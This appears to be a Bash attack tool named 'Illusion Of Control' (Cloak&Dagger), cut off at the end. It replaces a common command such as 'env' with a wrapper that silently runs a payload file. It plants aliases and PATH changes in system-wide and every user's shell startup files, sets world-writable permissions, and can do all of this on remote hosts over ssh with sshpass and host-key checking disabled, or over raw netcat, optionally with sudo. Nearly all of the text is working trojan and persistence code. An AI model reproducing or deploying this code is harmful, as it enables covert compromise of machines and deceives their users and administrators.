#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# (I.O.C) Illusion Of Control - v1.0Cloak&Dagger

declare -A CARGO_SCRIPTS
declare -a BASH_STARTUP_SCRIPTS

SCRIPT_NAME='Illusion Of Control'
VERSION='Cloak&Dagger'
VERSION_NO='1.1'

# HOT PARAMETERS

COMMAND_TO_CLOAK="env"
CLOAK_ORDER='pre-exec'    # (pre-exec | post-exec)
PATH_DIRECTORY="/tmp/.uzr/bin"
DAGGER_FILE="${PATH_DIRECTORY}/${COMMAND_TO_CLOAK}.dgr"
TARGET="local"            # (local | remote)
CONNECTION_TYPE="raw"     # (raw | ssh)
REMOTE=""
SETUP_PATH=0              # (0 | 1)
FORCE_COMMAND=0           # (0 | 1)
TMP_FILE='/tmp/ioc-cli.tmp'

# COLD PARAMETERS

TIMEOUT_SEC=5
HOME_DIR="/home"
SU_DIR="/root"
PARENT_DIR="`dirname ${BASH_SOURCE[0]}`"
BASH_RC=".bashrc"
SHELL_DIRECTORY_PATHS=( `echo $PATH | sed 's/:/ /g'` )
SHELL_COMMAND_PATHS=()
CNX_COUNT=0
COUNT_FILE='.ioc.cnx.cnt'
SUDO_FLAG=0
CARGO_SCRIPTS=(
['ssh-cmd']="${PARENT_DIR}/ssh-command.exp"
)
BASH_STARTUP_SCRIPTS=(
"/etc/profile"
"/etc/bash_profile"
"/etc/bashrc"
)

# FETCHERS

function fetch_all_remote_user_bashrc_files () {
    local CONNECTION_DETAILS="$1"
    COMMAND_STRING=`format_find_all_bashrc_files_instruction`
    for path in `connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`; do
        if [ -z "$path" ]; then
            continue
        fi
        echo "$path"
    done
    return 0
}

function fetch_all_remote_bash_startup_scripts () {
    local CONNECTION_DETAILS="$1"
    fetch_bash_shell_startup_scripts "$CONNECTION_DETAILS"
    fetch_all_remote_user_bashrc_files "$CONNECTION_DETAILS"
    return $?
}

function fetch_remote_address_from_connection_details () {
    local CONNECTION_DETAILS="$1"
    echo "$CONNECTION_DETAILS" | cut -d':' -f 1 | cut -d'@' -f 2
    return $?
}

function fetch_remote_port_from_connection_details () {
    local CONNECTION_DETAILS="$1"
    echo "$CONNECTION_DETAILS" | cut -d':' -f 2
    return $?
}

function fetch_remote_user_from_connection_details () {
    local CONNECTION_DETAILS="$1"
    echo "$CONNECTION_DETAILS" | cut -d':' -f 1 | cut -d'@' -f 1
    return $?
}

function fetch_remote_password_from_connection_details () {
    local CONNECTION_DETAILS="$1"
    echo "$CONNECTION_DETAILS" | cut -d':' -f 3
    return $?
}

function fetch_command_path () {
    local COMMAND="$1"
    COMMAND_PATH=`type "$COMMAND" | awk '{print $NF}'`
    return 0
}

function fetch_all_user_bashrc_files () {
    for path in `find / -name "$BASH_RC" -type f 2> /dev/null | grep "$HOME_DIR"`; do
        if [ -z "$path" ]; then
            continue
        fi
        echo "$path"
    done
    return 0
}

function fetch_bash_shell_startup_scripts () {
    for item in "${BASH_STARTUP_SCRIPTS[@]}"; do
        echo "$item"
    done
    return $?
}

function fetch_all_bash_startup_scripts () {
    fetch_bash_shell_startup_scripts
    fetch_all_user_bashrc_files
    return $?
}

# SETTERS

function set_sudo_flag () {
    local FLAG=$1
    if [ ! $FLAG -eq $FLAG ]; then
        echo "[ WARNING ]: Invalid SUDO flag value ($FLAG). Defaulting to 0."
        local FLAG=0
    fi
    SUDO_FLAG=$FLAG
    return 0
}

function set_remote_path_export () {
    local DIRECTORY="$1"
    local SCRIPT_FILE_PATH="$2"
    local CONNECTION_DETAILS="$3"
    echo "[ INFO ]: Corrupting remote BASH startup script ($SCRIPT_FILE_PATH)"\
        "to export directory ($DIRECTORY) to PATH."
    COMMAND_STRING=`format_export_remote_path_directory_instruction \
        "$DIRECTORY" "$SCRIPT_PATH"`
    echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
        "details ($CONNECTION_DETAILS)."
    CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
    local EXIT_CODE=$?
    echo "[ RESPONSE ]: $CNX"
    if [[ "$EXIT_CODE" == "0" ]]; then
        local EXIT_CODE=0
    echo "[ OK ]: Successfully corrupted remote startup script ($SCRIPT_FILE_PATH)"\
        "by exporting directory ($DIRECTORY) to PATH. ($EXIT_CODE)"
    else
        check_value_is_number $CNX
        if [ $? -eq 0 ]; then
            local EXIT_CODE=$CNX
        else
            local EXIT_CODE=1
        fi
        echo "[ NOK ]: Could not corrupt remote startup script ($SCRIPT_FILE_PATH)."
    fi
    return $EXIT_CODE
}

function set_cloak_directory_path () {
    local DIR_PATH="$1"
    PATH_DIRECTORY="$DIR_PATH"
    return 0
}

function set_remote_command_cloak_alias () {
    local COMMAND="$1"
    local CLOAK_FILE_PATH="$2"
    local CONNECTION_DETAILS="$3"
    echo "[ INFO ]: Corrupting BASH startup scripts to cloak command"\
         "($COMMAND) with ($CLOAK_FILE_PATH)."
    for script_path in `fetch_all_remote_bash_startup_scripts "$CONNECTION_DETAILS"`; do
        local ALIAS="alias ${COMMAND}='${CLOAK_FILE_PATH}'"
        COMMAND_STRING=`format_set_alias_to_script_path_instruction \
            "$ALIAS" "$script_path"`
        echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
            "details ($CONNECTION_DETAILS)."
        CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
        local EXIT_CODE=$?
        echo "[ RESPONSE ]: $CNX"
        if [[ "$EXIT_CODE" == "0" ]]; then
            local EXIT_CODE=0
            echo "[ OK ]: Successfully corrupted remote startup script"\
                "($script_path) with ($ALIAS). ($EXIT_CODE)"
        else
            check_value_is_number $CNX
            if [ $? -eq 0 ]; then
                local EXIT_CODE=$CNX
            else
                local EXIT_CODE=1
            fi
            echo "[ NOK ]: Could not corrupt remote startup script ($script_path)."
        fi
    done; echo
    return 0
}

function set_temporary_file_path () {
    local FILE_PATH="$1"
    if [ ! -f "$FILE_PATH" ]; then
        echo "[ WARNING ]: Temporary file not found ($FILE_PATH). "
        if [ $FORCE_COMMAND -eq 0 ]; then
            return 1
        elif [ $FORCE_COMMAND -eq 1 ]; then
            echo "[ INFO ]: Force flag is set. Attempting to create temporary file..."
            touch "$FILE_PATH" &> /dev/null
            if [ $? -ne 0 ]; then
                echo "[ ERROR ]: Something went wrong. Could not create file ($FILE_PATH)."
                return 2
            fi
        else
            return 3
        fi
    fi
    TMP_FILE="$FILE_PATH"
    return 0
}

function set_seconds_until_timeout () {
    local SECONDS=$1
    check_value_is_number $SECONDS
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Timeout value must be number of seconds, not ($SECONDS). Defaulting to (3)"
        SECONDS=3
    fi
    TIMEOUT_SEC=$SECONDS
    return 0
}

function set_force_flag () {
    local FLAG=$1
    if [ ! $FLAG -eq $FLAG ]; then
        echo "[ WARNING ]: Invalid force flag value ($FLAG). Defaulting to 0."
        local FLAG=0
    fi
    FORCE_COMMAND=$FLAG
    return 0
}

function set_command_cloak_alias () {
    local COMMAND="$1"
    local CLOAK_FILE_PATH="$2"
    echo "[ INFO ]: Corrupting BASH startup scripts to cloak command"\
         "($COMMAND) with ($CLOAK_FILE_PATH)."
    for script_path in `fetch_all_bash_startup_scripts`; do
        local ALIAS="alias ${COMMAND}='${CLOAK_FILE_PATH}'"
        echo "$ALIAS" 2> /dev/null >> $script_path
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Could not corrupt startup script ($script_path)."
            continue
        fi
        echo "[ OK ]: Successfully corrupted startup script ($script_path) with ($ALIAS)."
    done; echo
    return 0
}

function set_command_to_cloak () {
    local COMMAND="$1"
    COMMAND_TO_CLOAK="$COMMAND"
    return 0
}

function set_cloak_order () {
    local ORDER="$1"
    if [[ "$ORDER" != "pre-exec" ]] &&  [[ "$ORDER" != "post-exec" ]]; then
        echo "[ WARNING ]: Invalid cloak order ($ORDER). Defaulting to (pre-exec)."
        local ORDER="pre-exec"
    fi
    CLOAK_ORDER="$ORDER"
    return 0
}

function set_dagger_file_path () {
    local FILE_PATH="$1"
    if [ ! -f "$FILE_PATH" ]; then
        echo "[ NOK ]: Dagger file not found ($FILE_PATH). "
        local FILE_PATH=""
    fi
    DAGGER_FILE="$FILE_PATH"
    return 0
}

function set_target () {
    local TARGET_MACHINE="$1"
    if [[ "$TARGET_MACHINE" != 'local' ]] \
            && [[ "$TARGET_MACHINE" != 'remote' ]]; then
        echo "[ WARNING ]: Invalid target ($TARGET_MACHINE). Defaulting to (local)."
        local TARGET_MACHINE='local'
    fi
    TARGET="$TARGET_MACHINE"
    return 0
}

function set_remote_connection_type () {
    local CNX_TYPE="$1"
    if [[ "$CNX_TYPE" != 'raw'  ]] && [[ "$CNX_TYPE" != 'ssh' ]]; then
        echo ""
    fi
    CONNECTION_TYPE="$CNX_TYPE"
    return 0
}

function set_remote_connection_details () {
    local REMOTE_DETAILS="$1"
    check_valid_remote_connection_details "$REMOTE_DETAILS"
    if [[ $? -ne 0 ]]; then
        echo "[ NOK ]: Invalid remote connection details ($REMOTE_DETAILS)."
        local REMOTE_DETAILS=""
    fi
    REMOTE="$REMOTE_DETAILS"
    return 0
}

function set_setup_path_flag () {
    local FLAG="$1"
    check_value_is_number $FLAG
    if [ $? -ne 0 ]; then
        echo "[ WARNING ]: Invalid path setup flag value ($FLAG). Defaulting to (0)."
        FLAG=0
    fi
    SETUP_PATH=$FLAG
    return 0
}

function set_cloak_execution_order () {
    local ORDER="$1"
    if [[ "$ORDER" != "pre-exec" ]] && [[ "$ORDER" != "post-exec" ]]; then
        echo "[ WARNING ]: Invalid cloak execution order ($ORDER)."\
            "Defaulting to (pre-exec)."
        ORDER='pre-exec'
    fi
    CLOAK_ORDER="$ORDER"
    return 0
}

# ENSURANCE

function ensure_remote_path_directory_exists () {
    local DIR_PATH="$1"
    local CONNECTION_DETAILS="$2"
    COMMAND_STRING=`format_ensure_remote_path_directory_exists_instruction "$DIR_PATH"`
    echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
        "details ($CONNECTION_DETAILS)."
    CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
    local EXIT_CODE=$?
    echo "[ RESPONSE ]: $CNX"
    if [[ "$EXIT_CODE" == "0" ]]; then
        local EXIT_CODE=0
        echo "[ OK ]: Ensured remote directory ($DIR_PATH) exists. ($EXIT_CODE)"
    else
        check_value_is_number $CNX
        if [ $? -eq 0 ]; then
            local EXIT_CODE=$CNX
        else
            local EXIT_CODE=1
        fi
        echo "[ NOK ]: Could not ensure remote directory ($DIR_PATH) exists."\
            "($EXIT_CODE)"
    fi
    return $EXIT_CODE
}

function ensure_remote_cloak_execution_rights () {
    local CLOAK_PATH="$1"
    local CONNECTION_DETAILS="$2"
    COMMAND_STRING=`format_set_remote_cloak_execution_rights_instruction "$CLOAK_PATH"`
    echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
        "details ($CONNECTION_DETAILS)."
    CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
    local EXIT_CODE=$?
    echo "[ RESPONSE ]: $CNX"
    if [[ "$EXIT_CODE" == "0" ]]; then
        local EXIT_CODE=0
        echo "[ OK ]: Ensured remote cloak ($CLOAK_PATH) execution rights"\
            "are set. ($EXIT_CODE)"
    else
        check_value_is_number $CNX
        if [ $? -eq 0 ]; then
            local EXIT_CODE=$CNX
        else
            local EXIT_CODE=1
        fi
        echo "[ NOK ]: Could not ensure remote cloak ($CLOAK_PATH) execution"\
            "rights are set. ($EXIT_CODE)"
    fi
    return $EXIT_CODE
}

function ensure_remote_path_directory_set () {
    local DIRECTORY="$1"
    local CONNECTION_DETAILS="$2"
    export_remote_path_directory "$DIRECTORY" "$CONNECTION_DETAILS"
    return $?
}

function ensure_path_directory_set () {
    local DIRECTORY="$1"
    check_directory_in_path "$DIRECTORY"
    if [ $? -eq 0 ]; then
        return 0
    fi
    export_path_directory "$DIRECTORY"
    return $?
}

function ensure_path_directory_exists () {
    local DIRECTORY="$1"
    if [ ! -d "$DIRECTORY" ]; then
        mkdir -p "$DIRECTORY" &> /dev/null
        return $?
    fi
    return 0
}

function ensure_cloak_execution_rights () {
    local CLOAK_FILE_PATH="$1"
    chmod 777 "$CLOAK_FILE_PATH" &> /dev/null
    return $?
}

# CONNECTORS

function connect_and_execute_ssh () {
    local COMMAND="$1"
    local CONNECTION_DETAILS="$2"
    CNX_ADDR=`fetch_remote_address_from_connection_details "$CONNECTION_DETAILS"`
    CNX_PORT=`fetch_remote_port_from_connection_details "$CONNECTION_DETAILS"`
    CNX_USER=`fetch_remote_user_from_connection_details "$CONNECTION_DETAILS"`
    CNX_PASS=`fetch_remote_password_from_connection_details "$CONNECTION_DETAILS"`
    if [ -f "${CARGO_SCRIPTS['ssh-cmd']}" ]; then
        ${CARGO_SCRIPTS['ssh-cmd']} ${CNX_USER} ${CNX_ADDR} ${CNX_PORT} ${CNX_PASS} ${COMMAND} &> /dev/null
        return $?
    fi
    echo "$CNX_PASS" > "$TMP_FILE" 2> /dev/null
    if [ -z "$CNX_PASS" ]; then
        ssh -p $CNX_PORT "$CNX_USER@$CNX_ADDR" "$COMMAND"
        local EXIT_CODE=$?
    else
        sshpass -f "$TMP_FILE" \
            ssh -o StrictHostKeyChecking=no \
            -p $CNX_PORT "$CNX_USER@$CNX_ADDR" "$COMMAND"
        local EXIT_CODE=$?
    fi
    echo -n > "$TMP_FILE" 2> /dev/null
    return $EXIT_CODE
}


function connect_and_execute_raw () {
    local COMMAND="$1"
    local CONNECTION_DETAILS="$2"
    CNX_ADDR=`fetch_remote_address_from_connection_details "$CONNECTION_DETAILS"`
    CNX_PORT=`fetch_remote_port_from_connection_details "$CONNECTION_DETAILS"`
    # [ WARNING ]: Using raw connections you cannot confirm command output or
    # exit codes.
    CNX=`echo "$COMMAND" | nc "$CNX_ADDR" $CNX_PORT -w $TIMEOUT_SEC` # 2>&1
    return 0
}

function connect_and_execute () {
    local COMMAND="$1"
    local CONNECTION_DETAILS="$2"
    case "$CONNECTION_TYPE" in
        'raw')
            connect_and_execute_raw "$COMMAND" "$CONNECTION_DETAILS"
            ;;
        'ssh')
            connect_and_execute_ssh "$COMMAND" "$CONNECTION_DETAILS"
            ;;
        *)
            echo "[ WARNING ]: Invalid connection type ($CONNECTION_TYPE). Defaulting to (raw)."
            connect_and_execute_raw "$COMMAND" "$CONNECTION_DETAILS"
            ;;
    esac
    local EXIT_CODE=$?
    increment_connection_count
    return $EXIT_CODE
}

# GENERAL

function export_remote_path_directory () {
    local DIRECTORY="$1"
    local CONNECTION_DETAILS="$2"
    echo "[ INFO ]: Corrupting remote BASH startup scripts to export PATH(${DIRECTORY}:),"
    for script_path in `fetch_all_remote_bash_startup_scripts "$CONNECTION_DETAILS"`; do
        set_remote_path_export "$DIRECTORY" "$script_path" "$CONNECTION_DETAILS"
    done
    return 0
}

function export_path_directory () {
    local DIRECTORY="$1"
    local NEW_PATH="${DIRECTORY}:${PATH}"
    echo "[ INFO ]: Corrupting BASH startup scripts to export PATH ($NEW_PATH)."
    for script_path in `fetch_all_bash_startup_scripts`; do
        local EXPORT="export PATH=$NEW_PATH"
        echo "$EXPORT" 2> /dev/null >> "$script_path"
        if [ $? -ne 0 ]; then
            echo "[ NOK ]: Could not corrupt startup script ($script_path)."
            continue
        fi
        echo "[ OK ]: Successfully corrupted startup script ($script_path) with ($EXPORT)."
    done; echo
    export PATH="$NEW_PATH"
    return 0
}

function increment_connection_count () {
    local INCREMENT_BY=1
    CONTENT=`cat $COUNT_FILE || echo -n > $COUNT_FILE &> /dev/null`
    if [ -z "$CONTENT" ]; then
        local CONTENT=0
    fi
    NEW_CNX_COUNT=`echo "$CONTENT + $INCREMENT_BY" | bc`
    CNX_COUNT=$NEW_CNX_COUNT
    echo $CNX_COUNT > $COUNT_FILE
    return 0
}

function discover_all_files_in_directory () {
    local DIRECTORY="$1"
    if [ ! -d "$DIRECTORY" ]; then
        echo "[ ERROR ]: Directory ($DIRECTORY) not found."
        return 1
    fi
    find $DIRECTORY -type f
    return $?
}

function discover_all_shell_command_paths () {
    if [ ${#SHELL_DIRECTORY_PATHS[@]} -eq 0 ]; then
        echo "[ WARNING ]: No shell directory paths found."
        return 1
    fi
    for dir_path in ${SHELL_DIRECTORY_PATHS[@]}; do
        COMMANDS=( `discover_all_files_in_directory "$dir_path"` )
        SHELL_COMMAND_PATHS=( ${SHELL_COMMAND_PATHS[@]} ${COMMANDS[@]} )
    done
    return $?
}

# CHECKERS

function check_remote_command_exists () {
    local COMMAND="$1"
    local CONNECTION_DETAILS="$2"
    COMMAND_STRING=`format_check_remote_command_exists_instruction "$COMMAND"`
    echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
        "details ($CONNECTION_DETAILS)."
    CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
    local EXIT_CODE=$?
    echo "[ RESPONSE ]: $CNX"
    if [[ "$EXIT_CODE" == "0" ]]; then
        local EXIT_CODE=0
        echo "[ OK ]: Remote command ($COMMAND) exists. ($EXIT_CODE)"
    else
        check_value_is_number $CNX
        if [ $? -eq 0 ]; then
            local EXIT_CODE=$CNX
        else
            local EXIT_CODE=1
        fi
        echo "[ NOK ]: Remote command ($COMMAND) does not exist. ($EXIT_CODE)"
    fi
    return $EXIT_CODE
}

function check_remote_path_directory_exists () {
    local DIRECTORY="$1"
    local CONNECTION_DETAILS="$2"
    COMMAND_STRING=`format_check_remote_path_directory_exists_instruction "$DIRECTORY"`
    echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
        "details ($CONNECTION_DETAILS)."
    CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
    local EXIT_CODE=$?
    echo "[ RESPONSE ]: $CNX"
    if [[ "$EXIT_CODE" == "0" ]]; then
        local EXIT_CODE=0
        echo "[ OK ]: Remote directory ($DIRECTORY) exists. ($EXIT_CODE)"
    else
        check_value_is_number $CNX
        if [ $? -eq 0 ]; then
            local EXIT_CODE=$CNX
        else
            local EXIT_CODE=1
        fi
        echo "[ NOK ]: Remote directory ($DIRECTORY) does not exist. ($EXIT_CODE)"
    fi
    return $EXIT_CODE
}

function check_valid_remote_connection_details () {
    local REMOTE_DETAILS="$1"
    echo "$REMOTE_DETAILS" | \
        egrep -e "*@[a-zA-Z0-9_. ]{1,}:[0-9]{1,}*" &> /dev/null
    return $?
}

function check_value_is_number () {
    local VALUE=$1
    test $VALUE -eq $VALUE &> /dev/null
    return $?
}

function check_directory_in_path () {
    local DIRECTORY="$1"
    echo $PATH | grep "$DIRECTORY" &> /dev/null
    return $?
}

function check_command_exists () {
     local COMMAND="$1"
     type "$COMMAND" &> /dev/null
     return $?
}

# CREATORS

function create_remote_command_cloak () {
    local COMMAND="$1"
    local DAGGER_FILE_PATH="$2"
    local PATH_DIRECTORY="$3"
    local CONNECTION_DETAILS="$4"
    local CMD_CLOAK="${PATH_DIRECTORY}/${COMMAND_TO_CLOAK}"

    COMMAND_STRING=`format_clear_cloak_instruction "$CMD_CLOAK"`
    echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
        "details ($CONNECTION_DETAILS)."
    CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
    local EXIT_CODE=$?
    echo "[ RESPONSE ]: $CNX"
    if [[ "$EXIT_CODE" == "0" ]]; then
        echo "[ OK ]: Successfully cleared remote cloak file ($CMD_CLOAK). (0)"
    else
        check_value_is_number $CNX
        if [ $? -eq 0 ]; then
            local EXIT_CODE=$CNX
        else
            local EXIT_CODE=1
        fi
        echo "[ NOK ]: Could not clear remote cloak file ($CMD_CLOAK). ($EXIT_CODE)"
        return $EXIT_CODE
    fi

    ensure_remote_cloak_execution_rights "$CMD_CLOAK" "$CONNECTION_DETAILS"
    SHEBANG=`cat "$DAGGER_FILE_PATH" | grep '^#!/'`
    if [ ! -z "$SHEBANG" ]; then
        COMMAND_STRING=`format_add_shebang_to_cloak_instruction \
            "$SHEBANG" "$CMD_CLOAK"`
        echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
            "details ($CONNECTION_DETAILS)."
        CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
        local EXIT_CODE=$?
        echo "[ RESPONSE ]: $CNX"
        if [[ "$EXIT_CODE" == "0" ]]; then
            local EXIT_CODE=0
            echo "[ OK ]: Added shebang ($SHEBANG) to command cloak"\
                "($CMD_CLOAK). ($EXIT_CODE)"
        else
            check_value_is_number $CNX
            if [ $? -eq 0 ]; then
                local EXIT_CODE=$CNX
            else
                local EXIT_CODE=1
            fi
            echo "[ NOK ]: Could not add shebang ($SHEBANG) to command cloak"\
                "($CMD_CLOAK). ($EXIT_CODE)"
            return $EXIT_CODE
        fi
    fi

    COMMAND_STRING=''
    case "$CLOAK_ORDER" in
        'pre-exec')
            COMMAND_STRING=`format_append_to_cloak_pre_exec_instruction \
                "$COMMAND" "$DAGGER_FILE_PATH" "$CMD_CLOAK"`
            ;;
        'post-exec')
            COMMAND_STRING=`format_append_to_cloak_post_exec_instruction \
                "$COMMAND" "$DAGGER_FILE_PATH" "$CMD_CLOAK"`
            ;;
        *)
            return 4
            ;;
    esac

    echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
        "details ($CONNECTION_DETAILS)."
    CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
    local EXIT_CODE=$?
    echo "[ RESPONSE ]: $CNX"
    if [[ "$EXIT_CODE" == "0" ]]; then
        local EXIT_CODE=0
        echo "[ OK ]: Cloaked remote command ($COMMAND) using dagger file"\
            "($DAGGER_FILE_PATH) in ($CLOAK_ORDER) order. Cloak path"\
            "($CMD_CLOAK). ($EXIT_CODE)"
    else
        check_value_is_number $CNX
        if [ $? -eq 0 ]; then
            local EXIT_CODE=$CNX
        else
            local EXIT_CODE=1
        fi
        echo "[ NOK ]: Could not cloak remote command ($COMMAND) using"\
            "dagger file ($DAGGER_FILE_PATH). ($EXIT_CODE)"
        return $EXIT_CODE
    fi

    set_remote_command_cloak_alias "$COMMAND" "$CMD_CLOAK" "$CONNECTION_DETAILS"
    return $?
}

function create_command_cloak () {
    local COMMAND="$1"
    local DAGGER_FILE_PATH="$2"
    local PATH_DIRECTORY="$3"
    local CMD_CLOAK="${PATH_DIRECTORY}/${COMMAND}"
    echo -n 2> /dev/null > "$CMD_CLOAK"
    ensure_cloak_execution_rights "$CMD_CLOAK"
    SHEBANG=`cat "$DAGGER_FILE_PATH" | grep '^#!/'`
    if [ ! -z "$SHEBANG" ]; then
        echo "$SHEBANG" 2> /dev/null > "$CMD_CLOAK"
    fi
    case "$CLOAK_ORDER" in
        'pre-exec')
            cat "$DAGGER_FILE_PATH" 2> /dev/null | grep -v '^#!/' >> "$CMD_CLOAK"
            echo "$COMMAND"' $@' 2> /dev/null >> "$CMD_CLOAK"
            ;;
        'post-exec')
            echo "$COMMAND"' $@' 2> /dev/null >> "$CMD_CLOAK"
            cat "$DAGGER_FILE_PATH" 2> /dev/null | grep -v '^#!/' >> "$CMD_CLOAK"
            ;;
        *)
            return 4
            ;;
    esac
    set_command_cloak_alias "$COMMAND" "$CMD_CLOAK"
    return $?
}

# FORMATTERS

function format_export_remote_path_directory_instruction () {
    local DIRECTORY="$1"
    local SCRIPT_PATH="$2"
    local EXPORT='export PATH='"$DIRECTORY"':${PATH}'
    local COMMAND="echo '$EXPORT' 2> /dev/null >> '$SCRIPT_PATH'; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_set_alias_to_script_path_instruction () {
    local ALIAS="$1"
    local SCRIPT_PATH="$2"
    local COMMAND="echo '$ALIAS' 2> /dev/null >> '$SCRIPT_PATH'; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_clear_cloak_instruction () {
    local CMD_CLOAK="$1"
    local COMMAND="echo -n 2> /dev/null > $CMD_CLOAK; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_add_shebang_to_cloak_instruction () {
    local BANG="$1"
    local CLOAK="$2"
    local COMMAND="echo '${BANG}' 2> /dev/null > $CLOAK; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_append_to_cloak_pre_exec_instruction () {
    local COMMAND="$1"
    local DAGGER_FILE_PATH="$2"
    local CMD_CLOAK="$3"
    DAGGER=`cat $DAGGER_FILE_PATH`
    local FRMT_CMD1="echo '${DAGGER}' | grep -v '^#!/' >> $CMD_CLOAK;"
    local FRMT_CMD2="echo '$COMMAND \$@' 2> /dev/null >> $CMD_CLOAK; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local FRMT_CMD1="sudo ${FRMT_CMD1}"
        local FRMT_CMD2="sudo ${FRMT_CMD2}"
    fi
    local FRMT_CMD="${FRMT_CMD1} ${FRMT_CMD2}"
    echo ${FRMT_CMD}
    return $?
}

function format_append_to_cloak_post_exec_instruction () {
    local COMMAND="$1"
    local DAGGER_FILE_PATH="$2"
    local CMD_CLOAK="$3"
    DAGGER=`cat $DAGGER_FILE_PATH`
    local FRMT_CMD1="echo '$COMMAND \$@' >> $CMD_CLOAK;"
    local FRMT_CMD2="echo '${DAGGER}' | grep -v '^#!/' >> $CMD_CLOAK; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local FRMT_CMD1="sudo ${FRMT_CMD1}"
        local FRMT_CMD2="sudo ${FRMT_CMD2}"
    fi
    local FRMT_CMD="${FRMT_CMD1} ${FRMT_CMD2}"
    echo ${FRMT_CMD}
    return $?
}

function format_find_all_bashrc_files_instruction () {
    local COMMAND="find / -name '$BASH_RC' -type f 2> /dev/null"
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_ensure_remote_path_directory_exists_instruction () {
    local DIR_PATH="$1"
    local FRMT_CMD1="[ -d '$DIR_PATH' ] &> /dev/null || ("
    local FRMT_CMD2="mkdir -p '$DIR_PATH' &> /dev/null && "
    local FRMT_CMD3="chmod 777 $DIR_PATH &> /dev/null); echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
        local FRMT_CMD1="sudo $FRMT_CMD1"
        local FRMT_CMD2="sudo $FRMT_CMD2"
        local FRMT_CMD3="sudo $FRMT_CMD3"
    fi
    local COMMAND="$FRMT_CMD1 $FRMT_CMD2 $FRMT_CMD3"
    echo ${COMMAND}
    return $?
}

function format_set_remote_cloak_execution_rights_instruction () {
    local CLOAK_FILE_PATH="$1"
    local COMMAND="chmod 777 $CLOAK_FILE_PATH &> /dev/null; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_check_remote_cloak_execution_rights_instruction () {
    local CLOAK_FILE_PATH="$1"
    local COMMAND="chmod 777 '$CLOAK_FILE_PATH' &> /dev/null; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_check_remote_command_exists_instruction () {
    local COMMAND="$1"
    local COMMAND="type $COMMAND &> /dev/null; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_check_remote_path_directory_exists_instruction () {
    local DIR_PATH="$1"
    local COMMAND="[ -d $DIR_PATH ] &> /dev/null; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

function format_check_remote_path_directory_set_instruction () {
    local DIR_PATH="$1"
    local COMMAND="echo \$PATH | grep $DIR_PATH &> /dev/null; echo "'$?'
    if [ ${SUDO_FLAG} -eq 1 ]; then
        local COMMAND="sudo ${COMMAND}"
    fi
    echo ${COMMAND}
    return $?
}

# INIT

function init_remote_command_cloak_and_dagger () {
    local COMMAND="$1"
    local DAGGER_FILE_PATH="$2"
    local PATH_DIR="$3"
    local CONNECTION_DETAILS="$4"

    echo "[ INFO ]: Checking remote command ($COMMAND) exists..."
    check_remote_command_exists "$COMMAND" "$CONNECTION_DETAILS"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ] || [ -z "$EXIT_CODE" ]; then
        echo "[ ERROR ]: Remote command ($COMMAND) not recognized."\
            "Aborting action."
        return 5
    fi

    echo "[ INFO ]: Ensuring remote directory path ($PATH_DIR) exists..."
    ensure_remote_path_directory_exists "$PATH_DIR" "$CONNECTION_DETAILS"
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ] || [ -z "$EXIT_CODE" ]; then
        echo "[ ERROR ]: Could not ensure remote path directory"\
            "($PATH_DIR) exists. Aborting action."
        return 6
    fi

    if [ $SETUP_PATH -eq 1 ]; then
        echo "[ INFO ]: Ensuring remote PATH directory ($PATH_DIR) set..."
        ensure_remote_path_directory_set "$PATH_DIR" "$CONNECTION_DETAILS"
        local EXIT_CODE=$?
        if [ $EXIT_CODE -ne 0 ] || [ -z "$EXIT_CODE" ]; then
            echo "[ ERROR ]: Could not ensure remote path directory"\
                "($PATH_DIR) is set. Aborting action."
